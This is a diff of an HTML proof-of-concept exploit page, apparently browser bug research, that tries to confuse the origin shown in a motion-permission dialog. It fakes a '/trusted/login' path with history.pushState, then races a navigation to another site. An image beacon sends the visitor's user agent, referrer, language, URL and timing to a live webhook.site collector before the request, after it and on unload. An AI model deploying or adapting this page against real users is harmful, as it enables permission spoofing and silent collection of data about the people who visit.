@@ -6,50 +6,25 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
-body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, system-ui;
-  background: #f5f5f7;
-  text-align: center;
-}
-button {
-  font-size: 15px;
-  padding: 12px 16px;
-  border-radius: 12px;
-  border: none;
-  background: #007aff;
-  color: #fff;
-  margin: 8px;
-}
-#panel {
-  display: none;
-  max-width: 420px;
-  margin: 80px auto;
-  background: #fff;
-  padding: 24px;
-  border-radius: 16px;
-  box-shadow: 0 20px 60px rgba(0,0,0,.2);
-}
-.notice {
-  margin-top: 14px;
-  font-size: 13px;
-  color: #b00020;
-}
+body{margin:0;font-family:-apple-system,BlinkMacSystemFont,system-ui;background:#f5f5f7;text-align:center}
+button{font-size:15px;padding:12px 16px;border-radius:12px;border:none;background:#007aff;color:#fff;margin:8px}
+#panel{display:none;max-width:420px;margin:80px auto;background:#fff;padding:24px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.2)}
+.notice{margin-top:14px;font-size:13px;color:#b00020}
 </style>
 </head>
 
 <body>
 
 <h2 style="margin-top:60px;">Permission Origin Confusion PoC</h2>
-<p>Attacker-controlled page</p>
+<p>Attacker-controlled origin</p>
 
 <button id="start">Start PoC</button>
 
 <div id="panel">
-  <h3>Request Sensitive Permission</h3>
-  <p>Observe permission dialog origin</p>
+  <h3>Request Motion Permission</h3>
+  <p>Observe origin shown in permission dialog</p>
 
-  <button onclick="reqMotion()">🧭 Enable Motion</button>
+  <button id="motion">🧭 Enable Motion</button>
 
   <p id="output">Result: -</p>
 
@@ -60,62 +35,85 @@ button {
 
 <script>
 /* ================= CONFIG ================= */
-const WEBHOOK = 'https://webhook.site/a132a5ec-337f-46d5-958f-f8a8f9376120';
+const WEBHOOK    = 'https://webhook.site/a132a5ec-337f-46d5-958f-f8a8f9376120';
+const NAV_TARGET = 'https://google.com:9090'; // target navigasi (pending)
 
+/* ================= HELPERS ================= */
 const panel  = document.getElementById('panel');
 const output = document.getElementById('output');
 
-/* ================= GET PROOF (STABLE) ================= */
-function sendProofGET(status) {
+/* ================= PROOF (GET ONLY) ================= */
+function sendProof(status, phase){
   const params = new URLSearchParams({
     poc: 'permission-origin-desync',
     permission: 'motion',
-    status: status,
+    permission_result: status,
+    phase: phase, // before-permission | after-permission | unload
+
+    // attacker context
     attacker_origin: location.origin,
     attacker_url: location.href,
-    ua: navigator.userAgent,
-    ts: Date.now()
+    referrer: document.referrer || 'none',
+    protocol: location.protocol,
+    secure_ctx: window.isSecureContext,
+
+    // navigation context
+    nav_target: NAV_TARGET,
+    visibility: document.visibilityState,
+    history_len: history.length,
+
+    // timing
+    perf_now_ms: Math.round(performance.now()),
+    ts: Date.now(),
+
+    // environment
+    lang: navigator.language,
+    ua: navigator.userAgent
   });
 
-  // GET request yang TIDAK dibatalkan saat navigasi
+  // Image beacon = GET, paling stabil saat navigasi
   const img = new Image();
   img.src = WEBHOOK + '?' + params.toString();
 }
 
-/* ================= PERMISSION ================= */
-function reqMotion() {
-  if (typeof DeviceMotionEvent?.requestPermission === 'function') {
-    DeviceMotionEvent.requestPermission()
-      .then(res => {
-        output.textContent = 'Motion: ' + res;
-        sendProofGET(res);
-      })
-      .catch(() => {
-        output.textContent = 'Motion denied';
-        sendProofGET('error');
-      });
-  } else {
-    output.textContent = 'Motion API not supported';
-    sendProofGET('unsupported');
-  }
-}
-
-/* ================= ATTACK LOGIC ================= */
-/* Step 1: Fake trusted path */
+/* ================= STEP 1: URL MANIPULATION ================= */
 document.getElementById('start').onclick = () => {
   history.pushState({}, '', '/trusted/login');
   panel.style.display = 'block';
 };
 
-/* Step 2: Navigation race */
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://google.com:9090';
+/* ================= STEP 2: PERMISSION ================= */
+document.getElementById('motion').onclick = async () => {
+  // bukti sebelum permission (state masih attacker)
+  sendProof('requested', 'before-permission');
+
+  try {
+    if (typeof DeviceMotionEvent?.requestPermission === 'function') {
+      const res = await DeviceMotionEvent.requestPermission();
+      output.textContent = 'Motion: ' + res;
+      sendProof(res, 'after-permission');
+    } else {
+      output.textContent = 'Motion API not supported';
+      sendProof('unsupported', 'after-permission');
+    }
+  } catch {
+    output.textContent = 'Motion denied';
+    sendProof('error', 'after-permission');
+  }
+
+  // ================= STEP 3: NAVIGATION RACE =================
+  requestAnimationFrame(()=>{
+    requestAnimationFrame(()=>{
+      setTimeout(()=>{
+        location.href = NAV_TARGET;
       }, 80);
     });
   });
+};
+
+/* ================= LAST-CHANCE ================= */
+window.addEventListener('pagehide', () => {
+  sendProof('unknown', 'unload');
 });
 </script>
 
